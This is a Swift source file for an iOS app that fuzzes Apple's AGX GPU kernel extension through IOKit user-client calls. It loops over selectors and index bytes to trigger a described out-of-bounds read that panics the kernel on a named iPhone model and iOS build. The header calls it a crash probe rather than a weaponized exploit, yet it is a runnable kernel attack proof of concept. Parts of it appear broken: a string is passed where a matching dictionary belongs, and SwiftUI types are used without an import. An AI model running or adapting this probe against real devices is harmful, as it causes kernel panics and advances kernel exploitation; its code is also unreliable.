//
//  AGXProbe.swift
//  AGXProbe
//
//  iOS probe app to test AGXG18P channel-index OOB read reachability.
//  Target: iPhone18,1 / V53AP / t8150 / iOS 27.0.1 (24A446)
//  Kext: com.apple.AGXG18P
//
//  COMPILE IN XCODE on macOS with a free Apple ID dev cert (7-day).
//  Run ONLY on a secondary test device — NEVER on your daily phone.
//  A wrong index causes a wild kernel dereference → panic → reboot.
//
//  This is a crash probe, not a weaponized exploit.
//
//  Usage:
//    1. Open the app on the secondary iPhone.
//    2. Tap "Start Probe" — it iterates index 0..255 against AGXDeviceUserClient.
//    3. Watch for: app crash, SpringBoard respring, or device reboot.
//    4. Pull crash logs from the PC:
//       ipsw.exe idev crash ls
//       ipsw.exe idev crash pull -o analysis/ios/crashes
//

import UIKit
import IOKit

class ViewController: UIViewController {

    private let logView: UITextView = {
        let tv = UITextView()
        tv.isEditable = false
        tv.font = UIFont.monospacedSystemFont(ofSize: 12, weight: .regular)
        tv.backgroundColor = .black
        tv.textColor = .green
        return tv
    }()

    private let startButton: UIButton = {
        let b = UIButton(type: .system)
        b.setTitle("Start Probe (0..255)", for: .normal)
        b.titleLabel?.font = UIFont.boldSystemFont(ofSize: 16)
        b.backgroundColor = .systemBlue
        b.setTitleColor(.white, for: .normal)
        b.layer.cornerRadius = 8
        return b
    }()

    private let clearButton: UIButton = {
        let b = UIButton(type: .system)
        b.setTitle("Clear Log", for: .normal)
        b.titleLabel?.font = UIFont.systemFont(ofSize: 14)
        b.backgroundColor = .systemGray
        b.setTitleColor(.white, for: .normal)
        b.layer.cornerRadius = 6
        return b
    }()

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground

        logView.translatesAutoresizingMaskIntoConstraints = false
        startButton.translatesAutoresizingMaskIntoConstraints = false
        clearButton.translatesAutoresizingMaskIntoConstraints = false

        view.addSubview(logView)
        view.addSubview(startButton)
        view.addSubview(clearButton)

        NSLayoutConstraint.activate([
            logView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 10),
            logView.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 10),
            logView.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -10),
            logView.bottomAnchor.constraint(equalTo: startButton.topAnchor, constant: -10),

            startButton.heightAnchor.constraint(equalToConstant: 44),
            startButton.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 10),
            startButton.trailingAnchor.constraint(equalTo: view.centerXAnchor, constant: -5),
            startButton.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -10),

            clearButton.heightAnchor.constraint(equalToConstant: 44),
            clearButton.leadingAnchor.constraint(equalTo: view.centerXAnchor, constant: 5),
            clearButton.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -10),
            clearButton.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -10),
        ])

        startButton.addTarget(self, action: #selector(startProbe), for: .touchUpInside)
        clearButton.addTarget(self, action: #selector(clearLog), for: .touchUpInside)

        log("AGXProbe ready — iPhone18,1 / t8150 / iOS 27.0.1")
        log("Target: com.apple.AGXG18P channel-index OOB (0xfffffe0008556f54)")
        log("Tap 'Start Probe' to iterate index 0..255")
    }

    private func log(_ message: String) {
        DispatchQueue.main.async {
            let timestamp = DateFormatter.localizedString(from: Date(), dateStyle: .none, timeStyle: .medium)
            let line = "[\(timestamp)] \(message)\n"
            self.logView.text = (self.logView.text ?? "") + line
            let bottom = self.logView.contentSize.height - self.logView.bounds.size.height
            let offset = max(0, bottom)
            self.logView.setContentOffset(CGPoint(x: 0, y: offset), animated: false)
        }
    }

    @objc private func clearLog() {
        logView.text = ""
    }

    @objc private func startProbe() {
        startButton.isEnabled = false
        log("=== Starting AGX probe ===")

        DispatchQueue.global(qos: .userInitiated).async {
            self.probeAGX()
            DispatchQueue.main.async {
                self.log("=== Probe complete ===")
                self.startButton.isEnabled = true
            }
        }
    }

    private func probeAGX() {
        // Try multiple service names — AGXDeviceUserClient is the likely entry point
        let serviceNames = [
            "AGXDeviceUserClient",
            "AGXCLChannel",
            "AGX3DChannel",
            "AGXTAChannel",
            "AGXInvalidChannel",
        ]

        for serviceName in serviceNames {
            log("Looking up service: \(serviceName)")
            guard let service = IOServiceGetMatchingService(kIOMainPortDefault, serviceName as CFString) else {
                log("  service not found: \(serviceName)")
                continue
            }
            log("  service found: \(serviceName) (0x\(String(service, radix: 16)))")

            var connect: io_connect_t = 0
            let kr = IOServiceOpen(service, mach_task_self(), 0, &connect)
            IOObjectRelease(service)

            if kr != KERN_SUCCESS {
                log("  IOServiceOpen failed: \(kr) (0x\(String(kr, radix: 16)))")
                continue
            }
            log("  IOServiceOpen succeeded, connect=0x\(String(connect, radix: 16))")

            // Probe selectors 0..15 with indices 0..255
            for selector in 0..<16 {
                for index in 0..<255 {
                    var input: [UInt8] = Array(repeating: 0, count: 16)
                    input[0] = UInt8(index)   // index byte at offset 0
                    input[8] = 0x01           // mask low byte at offset 8

                    var output: [UInt64] = Array(repeating: 0, count: 16)
                    var outputSize = output.count * MemoryLayout<UInt64>.size

                    let inputSize = input.count

                    let result = IOConnectCallMethod(
                        connect,
                        UInt32(selector),
                        &input, UInt32(inputSize),
                        nil, 0,
                        &output, &outputSize,
                        nil, nil
                    )

                    if result != KERN_SUCCESS {
                        log("  sel=\(selector) idx=\(index) kr=\(result) (0x\(String(result, radix: 16)))")
                        // If we get a non-success that's not just "bad index", note it
                        if result != 0x10000002 { // kIOReturnBadArgument-ish
                            log("    NOTE: unexpected return for sel=\(selector) idx=\(index)")
                        }
                    }

                    // Small delay to avoid overwhelming the kernel
                    if index % 16 == 0 {
                        Thread.sleep(forTimeInterval: 0.001)
                    }
                }
            }

            IOConnectClose(connect)
            log("  closed connect for \(serviceName)")
        }
    }
}

// AppDelegate
@main
struct AGXProbeApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var delegate
    var body: some Scene {
        WindowGroup {
            ViewControllerRepresentable()
        }
    }
}

class AppDelegate: NSObject, UIApplicationDelegate {
    func application(_ application: UIApplication, didFinishLaunchingWithOptions options: [UIApplication.LaunchOptionsKey: Any]? = nil) -> Bool {
        return true
    }
}

struct ViewControllerRepresentable: UIViewControllerRepresentable {
    func makeUIViewController(context: Context) -> ViewController {
        return ViewController()
    }
    func updateUIViewController(_ uiViewController: ViewController, context: Context) {}
}
